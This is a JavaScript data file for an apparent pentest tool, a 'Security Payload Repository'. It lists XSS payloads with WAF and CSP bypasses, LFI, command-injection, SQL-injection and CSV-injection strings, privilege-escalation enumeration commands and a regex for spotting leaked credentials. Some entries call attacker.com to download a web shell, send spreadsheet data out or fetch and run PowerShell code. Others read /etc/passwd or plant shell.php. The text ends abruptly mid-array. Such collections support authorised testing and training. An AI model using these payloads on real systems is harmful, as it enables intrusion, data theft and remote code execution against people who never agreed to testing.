// Data repository for Security Payload Repository

// Wordlists data
const wordlistsData = [
    {
        name: "Raft medium form SecLists",
        description: "Collection of multiple types of lists used during security assessments",
        link: "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/raft-medium-directories.txt"
    },
    {
        name: "RockYou.txt",
        description: "Famous password wordlist with 14 million passwords",
        link: "https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz"
    },
    {
        name: "LFI-Jhaddix",
        description: "LFI payloads and patterns",
        link: "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt"
    },
    {
        name: "OnelistForAll",
        description: "Dictionary of attack patterns and primitives",
        link: "https://raw.githubusercontent.com/six2dez/OneListForAll/refs/heads/main/onelistforallshort.txt"
    },
    {
        name: "Jhaddix DNS",
        description: "comprehensive list of DNS subdomains and patterns",
        link: "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt"
    },
    {
        name: "Backup Files Wordlist",
        description: "Comprehensive list of backup file extensions and patterns",
        link: "https://raw.githubusercontent.com/coffinxp/payloads/refs/heads/main/backup_files_only.txt"
    },
    {
        name: "SQL Authentication Payloads",
        description: "Comprehensive wordlist of SQL authentication bypass payloads",
        link: "https://raw.githubusercontent.com/Jaikumar3/Wordlists/refs/heads/main/Sql%20auth%20Payloads"
    }
];

// XSS Payloads data organized by categories (based on PortSwigger's XSS Cheat Sheet)
const xssData = {
    basicPayloads: [
        {
            payload: "<script>alert(1)</script>",
            description: "Basic JavaScript alert payload"
        },
        {
            payload: "<img src=x onerror=alert(1)>",
            description: "Image error event XSS payload"
        },
        {
            payload: "<svg/onload=alert(1)>",
            description: "SVG onload event XSS payload"
        },
        {
            payload: "javascript:alert(1)",
            description: "JavaScript protocol handler XSS payload"
        }
    ],
    tagsBypass: [
        {
            payload: "<img src=1 onerror=alert(1)>",
            description: "Basic img tag XSS"
        },
        {
            payload: "<iframe src=\"javascript:alert(1)\"></iframe>",
            description: "iframe JavaScript protocol XSS"
        },
        {
            payload: "<svg><animate onbegin=alert(1) attributeName=x></svg>",
            description: "SVG animate tag XSS"
        },
        {
            payload: "<body onload=alert(1)>",
            description: "Body onload event XSS payload"
        },
        {
            payload: "<video><source onerror=\"javascript:alert(1)\">",
            description: "Video source error XSS payload"
        },
        {
            payload: "<audio src=x onerror=alert(1)>",
            description: "Audio error XSS payload"
        },
        {
            payload: "<script>onerror=alert;throw 1</script>",
            description: "Error handling XSS with throw statement"
        },
        {
            payload: "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\"></table></mtext></math>",
            description: "Complex MathML and table payload for WAF bypass"
        }
    ],
    attributesBypass: [
        {
            payload: "\" autofocus onfocus=alert(1) x=\"",
            description: "Autofocus attribute XSS"
        },
        {
            payload: "\" onfocus=alert(1) autofocus x=\"",
            description: "Onfocus attribute XSS"
        },
        {
            payload: "\" onmouseover=\"alert(1)",
            description: "Onmouseover attribute XSS"
        },
        {
            payload: "\" onload=\"alert(1)",
            description: "Onload attribute XSS"
        },
        {
            payload: "\" oninput=alert(1) x=\"",
            description: "Oninput attribute XSS"
        },
        {
            payload: "\" ontoggle=alert(1) id=x tabindex=1 style=display:block>#x",
            description: "Ontoggle attribute XSS"
        },
        {
            payload: "\" accesskey=\"x\" onclick=\"alert(1)\" x=\"",
            description: "Accesskey triggered XSS (press ALT+SHIFT+X on Windows)"
        },
        {
            payload: "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>",
            description: "SVG link XSS via xlink:href"
        }
    ],
    htmlEncoded: [
        {
            payload: "&lt;script&gt;alert(1)&lt;/script&gt;",
            description: "HTML encoded script tags"
        },
        {
            payload: "&lt;img src=x onerror=alert(1)&gt;",
            description: "HTML encoded img tag"
        },
        {
            payload: "&lt;svg onload=alert(1)&gt;",
            description: "HTML encoded SVG tag"
        },
        {
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;",
            description: "Decimal HTML encoded script tag"
        },
        {
            payload: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
            description: "Hexadecimal HTML encoded script tag"
        },
        {
            payload: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            description: "URL encoded script tag"
        },
        {
            payload: "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            description: "JavaScript hex escaped payload"
        }
    ],
    domBasedXSS: [
        {
            payload: "document.location.hash.substring(1)",
            description: "Extract hash fragment from URL"
        },
        {
            payload: "document.location.search.substring(1)",
            description: "Extract query string from URL"
        },
        {
            payload: "document.referrer",
            description: "Access document referrer"
        },
        {
            payload: "window.name",
            description: "Access window name property"
        },
        {
            payload: "location.href.match(/\\w+/)[0]",
            description: "URL parsing with regular expression"
        },
        {
            payload: "new Function(location.hash.slice(1))",
            description: "Function constructor with URL hash"
        },
        {
            payload: "eval(atob(location.hash.slice(1)))",
            description: "Base64 decoded eval from URL hash"
        },
        {
            payload: "document.write('<script>x='+location.hash.slice(1)+';<\\/script>')",
            description: "document.write from URL fragment"
        }
    ],
    filterEvasion: [
        {
            payload: "<script>eval(atob('YWxlcnQoMSk='))</script>",
            description: "Base64 encoded payload (alert(1))"
        },
        {
            payload: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            description: "Character code encoding"
        },
        {
            payload: "<script>throw onerror=alert,1</script>",
            description: "Throw statement to trigger alert"
        },
        {
            payload: "<script>({x:1})[\"constructor\"][\"constructor\"](\"alert(1)\")();</script>",
            description: "Constructor method execution"
        },
        {
            payload: "<script>function x(){ return this; }; x().alert(1);</script>",
            description: "Window reference via function scoping trick"
        },
        {
            payload: "<script>top[\"al\"+'ert'](1)</script>",
            description: "String concatenation to bypass filters"
        },
        {
            payload: "<script>/alert(1)/.source</script>",
            description: "Regular expression source property"
        },
        {
            payload: "<script>'alert(1)'.replace(/.+/, eval)</script>",
            description: "String replace with eval"
        }
    ],
    eventHandlers: [
        {
            payload: "<div onmouseover=\"alert(1)\">Hover Me</div>",
            description: "Mouse over event XSS payload"
        },
        {
            payload: "<details open ontoggle=alert(1)>",
            description: "Details element XSS payload"
        },
        {
            payload: "<select autofocus onfocus=alert(1)>",
            description: "Select focus event XSS"
        },
        {
            payload: "<input autofocus onfocus=alert(1)>",
            description: "Input focus event XSS"
        },
        {
            payload: "<textarea autofocus onfocus=alert(1)>",
            description: "Textarea focus event XSS"
        },
        {
            payload: "<iframe onload=alert(1)>",
            description: "Iframe load event XSS"
        },
        {
            payload: "<marquee onstart=alert(1)>",
            description: "Marquee start event XSS"
        },
        {
            payload: "<video autoplay onplay=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
            description: "Video play event XSS"
        }
    ],
    wafBypass: [
        {
            payload: "<script>alert&#40;1&#41</script>",
            description: "HTML entity encoding of parentheses"
        },
        {
            payload: "<script>confirm`1`</script>",
            description: "ES6 template literals (no parentheses)"
        },
        {
            payload: "<script>[1].find(alert)</script>",
            description: "Array method bypass (works in Firefox)"
        },
        {
            payload: "<script>window['alert'](1)</script>",
            description: "Bracket notation for function name"
        },
        {
            payload: "<script>top['ale'+'rt'](1)</script>",
            description: "String concatenation in bracket notation"
        },
        {
            payload: "<a href=\"javascript:void(alert(1))\">Click me</a>",
            description: "Javascript void with alert"
        },
        {
            payload: "<svg><animate onbegin=prompt(1) attributeName=x dur=1s>",
            description: "SVG animation event"
        },
        {
            payload: "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            description: "Custom element with focus"
        }
    ],
    polyglots: [
        {
            payload: "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\x3e",
            description: "XSS polyglot that works in many contexts"
        },
        {
            payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            description: "XSS polyglot with onclick event"
        },
        {
            payload: "'>\">\"><img src=x onerror=alert(1)>",
            description: "Simple context breaking polyglot"
        },
        {
            payload: "\"-confirm(1)-\"",
            description: "Attribute breaking polyglot"
        },
        {
            payload: "<w=\"/x=\"y>\"/ondblclick=`<`[alert``]>z",
            description: "Complex polyglot using ES6 features"
        },
        {
            payload: "\"'><svg/onload=';alert(1);'>",
            description: "SVG-based polyglot"
        },
        {
            payload: "\";alert(1)//",
            description: "Basic script context polyglot"
        },
        {
            payload: "'-confirm`1`-'",
            description: "Attribute quote breaking with ES6 templates"
        }
    ],
    contextSpecific: [
        {
            payload: "<script>alert(1)</script>",
            description: "HTML context - No additional encoding needed",
            browser: "All browsers"
        },
        {
            payload: "\"></span><script>alert(1)</script>",
            description: "Breaking out of HTML tag attribute and inserting script",
            browser: "All browsers"
        },
        {
            payload: "javascript:alert(1)",
            description: "URL context XSS in href, src, etc.",
            browser: "All browsers"
        },
        {
            payload: "'-alert(1)-'",
            description: "JavaScript string context break-out",
            browser: "All browsers"
        },
        {
            payload: "</script><script>alert(1)</script>",
            description: "Breaking out of existing script tag",
            browser: "All browsers"
        },
        {
            payload: "{{constructor.constructor('alert(1)')()}}",
            description: "AngularJS template injection",
            browser: "Sites using AngularJS"
        },
        {
            payload: "${alert(1)}",
            description: "JavaScript template literal injection",
            browser: "Modern browsers"
        },
        {
            payload: "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
            description: "SVG-based context",
            browser: "Chrome, Firefox"
        }
    ],
    browserSpecific: [
        {
            payload: "<img src=x onerror=alert(1)>",
            description: "Image error event - works in all browsers",
            browser: "All browsers"
        },
        {
            payload: "<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ホ+ネ+ヘ+ナ+ホ+ヌ+ツ+ネ+ホ+ミ+ハ](セ+ミ+ホ+ヌ+ネ+'(-~ウ)')()[ツ]</script>",
            description: "JSFuck-style obfuscation - Chrome-specific",
            browser: "Chrome"
        },
        {
            payload: "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            description: "XML namespaces in XHTML",
            browser: "Firefox"
        },
        {
            payload: "<div style=\"x:expression(alert(1))\">",
            description: "CSS expression in style (legacy)",
            browser: "Internet Explorer"
        },
        {
            payload: "<svg><set attributeName=\"onload\" to=\"alert(1)\" />",
            description: "SVG animation with attributeName",
            browser: "Firefox, Chrome"
        },
        {
            payload: "<link rel=\"import\" href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            description: "HTML Import feature (deprecated)",
            browser: "Chrome (older versions)"
        }
    ],
    cssBased: [
        {
            payload: "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
            description: "CSS Animation event handler XSS",
            browser: "Chrome, Firefox"
        },
        {
            payload: "<style>*[x]{color:red}</style><xss x=\"\" onbeforecopy=\"alert(1)\">Copy me</xss>",
            description: "CSS Selector + onbeforecopy event",
            browser: "Chrome"
        },
        {
            payload: "<style>:target {color:red}</style><xss id=x style=\"transition:color 1s\" ontransitionend=alert(1)></xss>",
            description: "CSS Transition + ontransitionend event",
            browser: "Chrome, Firefox"
        },
        {
            payload: "<style>input:focus { outline: 1px solid red; }</style><input onblur=alert(1) id=x>",
            description: "CSS pseudo-class with onblur event",
            browser: "All browsers"
        }
    ],
    htmlSpecific: [
        {
            payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>",
            description: "Form button formaction attribute XSS"
        },
        {
            payload: "<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>",
            description: "HTML5 form events for XSS"
        },
        {
            payload: "<input type=image src=x onerror=alert(1)>",
            description: "Input image source error XSS"
        },
        {
            payload: "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>",
            description: "MathML actiontype XSS"
        },
        {
            payload: "<object data=javascript:alert(1)>",
            description: "Object data attribute XSS"
        },
        {
            payload: "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
            description: "Iframe srcdoc attribute XSS"
        },
        {
            payload: "<table background=javascript:alert(1)></table>",
            description: "Table background attribute XSS"
        },
        {
            payload: "<map><area shape=rect coords=0,0,82,126 href=javascript:alert(1)>",
            description: "Image map area href XSS"
        },
        {
            payload: "<input type=hidden accesskey=x onclick=alert(1)>",
            description: "Hidden input with accesskey XSS (press ALT+SHIFT+X)"
        },
        {
            payload: "<embed src=javascript:alert(1)>",
            description: "Embed tag source XSS"
        },
        {
            payload: "<menu id=x contextmenu=x onshow=alert(1)>right click me!</menu>",
            description: "HTML5 context menu XSS"
        },
        {
            payload: "<isindex type=image src=1 onerror=alert(1)>",
            description: "Legacy isindex tag XSS (obsolete but still works in some browsers)"
        }
    ],
    angularPayloads: [
        {
            payload: "{{constructor.constructor('alert(1)')()}}",
            description: "Basic AngularJS template injection"
        },
        {
            payload: "{{$eval.constructor('alert(1)')()}}",
            description: "AngularJS $eval service exploitation"
        },
        {
            payload: "{{$on.constructor('alert(1)')()}}",
            description: "AngularJS $on service exploitation"
        },
        {
            payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
            description: "AngularJS charAt prototype override"
        },
        {
            payload: "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
            description: "Complex AngularJS prototype pollution"
        },
        {
            payload: "{{constructor.constructor('alert(document.domain)')()}}",
            description: "AngularJS with document.domain for origin identification"
        },
        {
            payload: "{{[].map.constructor('alert(1)')()}}",
            description: "AngularJS map method exploitation"
        },
        {
            payload: "{{'a'.constructor.fromCharCode=[].join;$eval('x=alert(1)')}}",
            description: "AngularJS fromCharCode method override"
        },
        {
            payload: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'(z=alert)(1)'>",
            description: "AngularJS event object exploitation with CSP bypass"
        },
        {
            payload: "<div ng-app ng-csp><input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>",
            description: "AngularJS composedPath method exploitation with CSP bypass"
        },
        {
            payload: "<div ng-app>{{$on.constructor('alert(1)')()}}</div>",
            description: "AngularJS in div context"
        },
        {
            payload: "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()</div>",
            description: "AngularJS with Content Security Policy bypass"
        },
        {
            payload: "<div ng-app ng-csp>{{$eval('JSON.parse(\"{\\\"constructor\\\":{\\\"prototype\\\":{\\\"charAt\\\":alert}}}\")[\\'constructor\\'].prototype.charAt(1)')}}</div>",
            description: "AngularJS JSON.parse exploitation and prototype chain"
        },
        {
            payload: "<script>Object.defineProperties(window, {chromium: {value: 1}});</script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            description: "AngularJS sandbox escape with Object.defineProperties"
        }
    ],
    // New XSS Encode Methods Section
    encodeMethods: {
        encodePayload: function(userput, method) {
            switch(method) {
                case 'html':
                    return userput.replace(/&/g, '&amp;')
                                .replace(/</g, '&lt;')
                                .replace(/>/g, '&gt;')
                                .replace(/"/g, '&quot;')
                                .replace(/'/g, '&#x27;');
                case 'url':
                    return encodeURIComponent(userput);
                case 'base64':
                    return btoa(userput);
                case 'hex':
                    return Array.from(userput).map(c => 
                        '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')
                    ).join('');
                case 'decimal':
                    return Array.from(userput).map(c => 
                        '&#' + c.charCodeAt(0) + ';'
                    ).join('');
                case 'js_escape':
                    return userput.replace(/[\\'"]/g, '\\$&');
                case 'unicode':
                    return Array.from(userput).map(c => 
                        '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
                    ).join('');
                case 'js_unicode':
                    return Array.from(userput).map(c => 
                        '\\u{' + c.charCodeAt(0).toString(16) + '}'
                    ).join('');
                default:
                    return userput; // Return unchanged if method not recognized
            }
        },
        getAllEncodings: function(userput) {
            const methods = ['html', 'url', 'base64', 'hex', 'decimal', 'js_escape', 'unicode', 'js_unicode'];
            const result = {};
            
            methods.forEach(method => {
                result[method] = this.encodePayload(userput, method);
            });
            
            return result;
        }
    }
};

// Regex Patterns data
const regexData = [
    {
        pattern: "^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6})*$",
        description: "Email address validation"
    },
    {
        pattern: "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
        description: "IPv4 address validation"
    },
    {
        pattern: "^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$",
        description: "MAC address validation"
    },
    {
        pattern: "^(?:https?:\\/\\/)?(?:www\\.)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(?:\\/[\\w\\-._~:/?#[\\]@!$&'()*+,;=]*)?$",
        description: "URL validation"
    },
    {
        pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
        description: "Strong password validation"
    },
    {
        pattern: "(?:[^<]*)<([^>]*)>(?:[^<]*)<\\/\\1>(?:[^<]*)",
        description: "Match HTML tags"
    },
    {
        pattern: "(?:\\d{1,3}\\.){3}\\d{1,3}(?=\\D|$)",
        description: "Find IP addresses in text"
    },
    {
        pattern: "\\b(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})\\b",
        description: "Find MAC addresses in text"
    },
    {
        pattern: "((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\\-,]{0,25})(=|>|:=|\\|\\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\\-_=]{8,64})['\"]",
        description: "Find sensitive API keys, tokens, passwords and credentials in Burp Suite"
    }
];

// External Resources data
const resourcesData = [
    {
        name: "PayloadsAllTheThings",
        description: "A list of useful payloads and bypass for Web Application Security",
        link: "https://github.com/swisskyrepo/PayloadsAllTheThings"
    },
    {
        name: "OWASP Cheat Sheet Series",
        description: "Collection of high value information on specific application security topics",
        link: "https://cheatsheetseries.owasp.org/"
    },
    {
        name: "HackTricks",
        description: "Comprehensive hacking techniques and tips",
        link: "https://book.hacktricks.xyz/"
    },
    {
        name: "Pentester's Lab",
        description: "Hands-on labs for security testing practice",
        link: "https://pentesterlab.com/"
    },
    {
        name: "PortSwigger Web Security Academy",
        description: "Free online training for web security testing",
        link: "https://portswigger.net/web-security"
    },
    {
        name: "Exploit Notes",
        description: "A collection of notes and resources for various exploits",
        link: "https://exploit-notes.hdks.org/"
    },
    {
        name: "CTF Search",
        description: "Advanced search engine for CTF challenges and writeups",
        link: "https://ctfsearch.hackmap.win/"   
    }
];

// OSINT Resources data
const osintResourcesData = [
    {
        name: "OSINT Framework",
        description: "Collection of OSINT tools categorized by resource type",
        link: "https://osintframework.com/"
    },
    {
        name: "IntelTechniques Tools",
        description: "Michael Bazzell's OSINT tools for various intelligence gathering tasks",
        link: "https://inteltechniques.com/tools/"
    },
    {
        name: "Maltego (Paterva)",
        description: "Visual link analysis tool for discovering connections between pieces of information",
        link: "https://www.paterva.com/"
    },
    {
        name: "SpiderFoot",
        description: "Open source intelligence automation tool for OSINT collection and reconnaissance",
        link: "https://www.spiderfoot.net/"
    },
    {
        name: "PhoneInfoga",
        description: "Advanced phone number scanner and information gathering tool",
        link: "https://github.com/sundowndev/phoneinfoga"
    },
    {
        name: "Recon-ng",
        description: "Web reconnaissance framework with independent modules for targeted information gathering",
        link: "https://github.com/lanmaster53/recon-ng"
    },
    {
        name: "GHunt",
        description: "OSINT tool to extract information from Google accounts using public information",
        link: "https://github.com/mxrch/GHunt"
    }
];

// HTML payloads data
const htmlPayloadsData = [
    {
        payload: "<marquee>Scrolling Text</marquee>",
        description: "Scrolling text element (deprecated but still works in most browsers)"
    },
    {
        payload: "<blink>Blinking Text</blink>",
        description: "Blinking text element (deprecated but may still work in some browsers)"
    },
    {
        payload: "<details><summary>Click to expand</summary><p>Hidden content here</p></details>",
        description: "Expandable details element with summary"
    },
    {
        payload: "<input type=\"text\" list=\"suggestions\"><datalist id=\"suggestions\"><option value=\"Option 1\"><option value=\"Option 2\"></datalist>",
        description: "Input with datalist for autocomplete suggestions"
    },
    {
        payload: "<meter min=\"0\" max=\"100\" value=\"75\">75%</meter>",
        description: "Meter element for displaying a gauge"
    },
    {
        payload: "<progress value=\"70\" max=\"100\">70%</progress>",
        description: "Progress bar element"
    },
    {
        payload: "<dialog open>This is a dialog box</dialog>",
        description: "Dialog element for modal content"
    },
    {
        payload: "<ruby>漢<rt>かん</rt>字<rt>じ</rt></ruby>",
        description: "Ruby annotations for East Asian typography"
    }
];

// Windows privilege escalation data
const windowsPrivescData = [
    {
        payload: "whoami /all",
        description: "Check current user privileges and groups"
    },
    {
        payload: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
        description: "Get OS information"
    },
    {
        payload: "wmic qfe get Caption,Description,HotFixID,InstalledOn",
        description: "List installed patches"
    },
    {
        payload: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
        description: "Find non-standard Windows services"
    },
    {
        payload: "wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i \"auto\"",
        description: "Find services with unquoted paths"
    },
    {
        payload: "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
        description: "Find services that Authenticated Users can modify"
    },
    {
        payload: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        description: "Check for AlwaysInstallElevated registry key"
    },
    {
        payload: "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        description: "Check for autorun executables in HKCU"
    }
];

// Windows privilege escalation resources
const windowsPrivescResourcesData = [
    {
        name: "LOLBAS",
        description: "Living Off The Land Binaries, Scripts and Libraries",
        link: "https://lolbas-project.github.io/"
    },
    {
        name: "Windows Privilege Escalation Fundamentals",
        description: "Comprehensive guide on Windows privesc techniques",
        link: "https://www.fuzzysecurity.com/tutorials/16.html"
    },
    {
        name: "PowerUp.ps1",
        description: "PowerShell script for Windows privilege escalation",
        link: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
    },
    {
        name: "Watson",
        description: "Enumerate missing KBs and suggest exploits for privilege escalation",
        link: "https://github.com/rasta-mouse/Watson"
    },
    {
        name: "Windows Exploit Suggester",
        description: "Tool to suggest exploits based on missing patches",
        link: "https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
    }
];

// Linux privilege escalation data
const linuxPrivescData = [
    {
        payload: "find / -perm -u=s -type f 2>/dev/null",
        description: "Find SUID executables"
    },
    {
        payload: "find / -perm -g=s -type f 2>/dev/null",
        description: "Find SGID executables"
    },
    {
        payload: "find / -writable -type d 2>/dev/null",
        description: "Find world-writable directories"
    },
    {
        payload: "find / -writable -type f -not -path \"/proc/*\" 2>/dev/null",
        description: "Find world-writable files"
    },
    {
        payload: "sudo -l",
        description: "List commands the current user can run with sudo"
    },
    {
        payload: "cat /etc/crontab",
        description: "Check system-wide cron jobs"
    },
    {
        payload: "ls -la /etc/cron.*",
        description: "Check cron job directories"
    },
    {
        payload: "cat /etc/passwd | grep -v nologin",
        description: "Find users with login shells"
    }
];

// Linux privilege escalation resources
const linuxPrivescResourcesData = [
    {
        name: "GTFOBins",
        description: "Curated list of Unix binaries that can be used to bypass security restrictions",
        link: "https://gtfobins.github.io/"
    },
    {
        name: "LinPEAS",
        description: "Linux Privilege Escalation Awesome Script",
        link: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
    },
    {
        name: "Linux Exploit Suggester 2",
        description: "Tool to identify potential Linux kernel exploits",
        link: "https://github.com/jondonas/linux-exploit-suggester-2"
    },
    {
        name: "LinEnum",
        description: "Scripted Local Linux Enumeration & Privilege Escalation Checks",
        link: "https://github.com/rebootuser/LinEnum"
    },
    {
        name: "Linux Smart Enumeration",
        description: "Linux enumeration tool for penetration testers",
        link: "https://github.com/diego-treitos/linux-smart-enumeration"
    }
];

// LFI Payloads data
const lfiData = [
    {
        payload: "../../../etc/passwd",
        description: "Basic LFI payload for Unix-like systems"
    },
    {
        payload: "../../../../../../etc/passwd",
        description: "Deep path traversal LFI payload"
    },
    {
        payload: "../../../../../../windows/win.ini",
        description: "Windows file inclusion payload"
    },
    {
        payload: "php://filter/convert.base64-encode/resource=index.php",
        description: "PHP filter wrapper to read source code"
    },
    {
        payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        description: "Data wrapper for PHP code execution"
    },
    {
        payload: "expect://id",
        description: "Expect wrapper for command execution"
    },
    {
        payload: "/proc/self/environ",
        description: "Access environment variables in Linux"
    },
    {
        payload: "php://input",
        description: "PHP input stream wrapper for code injection"
    }
];

// Command Injection Payloads data
const cmdInjectionData = [
    {
        payload: "; ls -la",
        description: "Basic command separator for Unix-like systems"
    },
    {
        payload: "| cat /etc/passwd",
        description: "Pipe to execute second command"
    },
    {
        payload: "`id`",
        description: "Command substitution using backticks"
    },
    {
        payload: "$(id)",
        description: "Command substitution using $() syntax"
    },
    {
        payload: "& whoami",
        description: "Background command execution"
    },
    {
        payload: "%0A ping -c 4 127.0.0.1",
        description: "URL encoded newline for command injection"
    },
    {
        payload: "> /var/www/html/shell.php",
        description: "Redirect output to create a file"
    },
    {
        payload: "|| curl https://attacker.com/shell.php -o shell.php",
        description: "Logical OR for command execution"
    }
];

// SQL Injection Payloads data
const sqlInjectionData = [
    {
        payload: "' OR 1=1 --",
        description: "Basic SQL authentication bypass"
    },
    {
        payload: "' UNION SELECT 1,2,3 --",
        description: "Basic UNION-based SQL injection"
    },
    {
        payload: "' OR '1'='1",
        description: "Alternative SQL authentication bypass"
    },
    {
        payload: "1' OR '1' = '1' /*",
        description: "SQL injection using comment"
    },
    {
        payload: "' OR 1=1 ORDER BY 1 --",
        description: "SQL injection with ORDER BY"
    },
    {
        payload: "admin'--",
        description: "Comment out remainder of the query"
    },
    {
        payload: "'; WAITFOR DELAY '0:0:5' --",
        description: "Time-based SQL injection for MS SQL"
    },
    {
        payload: "' OR (SELECT SLEEP(5)) --",
        description: "Time-based SQL injection for MySQL"
    }
];

// CSV Injection Payloads data
const csvInjectionData = [
    {
        payload: "=cmd|' /C calc'!A1",
        description: "Excel formula to launch calculator via command prompt"
    },
    {
        payload: "=DDE(\"cmd\";\"calc\";\"\")",
        description: "Dynamic Data Exchange (DDE) formula to execute calculator"
    },
    {
        payload: "@SUM(1+1)*cmd|' /C calc'!A0",
        description: "Excel formula with arithmetic operation to trigger command execution"
    },
    {
        payload: "+IMPORTXML(CONCAT(\"//\",'google',\".com\"),\"//a\")",
        description: "Google Sheets formula that leaks data via DNS"
    },
    {
        payload: "=HYPERLINK(\"data:text/html,<script>alert(1)</script>\",\"Click Me\")",
        description: "CSV cell that creates a malicious hyperlink"
    },
    {
        payload: "=WEBSERVICE(\"https://attacker.com/?\"&A1)",
        description: "Excel formula to exfiltrate data to external website"
    },
    {
        payload: "=cmd|' /C powershell IEX(New-Object Net.WebClient).downloadString(\\\"http://attacker.com/shell.ps1\\\")'!A0",
        description: "Excel formula to download and execute PowerShell payload"
    },
    {
        payload: "-1+1|cmd|'/C powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).downloadString(\\\"http://attacker.com/payload\\\")\"'!_xlfn.RANDBETWEEN",
        description: "Advanced formula for PowerShell execution with bypass"
    },
    {
        payload: "=INDIRECT(\"C:\\\\Windows\\\\System32\\\\calc.exe\")",
        description: "Excel INDIRECT function that can trigger executable"
    },
    {
        payload: "=cmd|'/c echo Vulnerable > C:\\CSV_Vulnerable.txt'!A0",
        description: "Write text to file using command prompt"
    },
    {
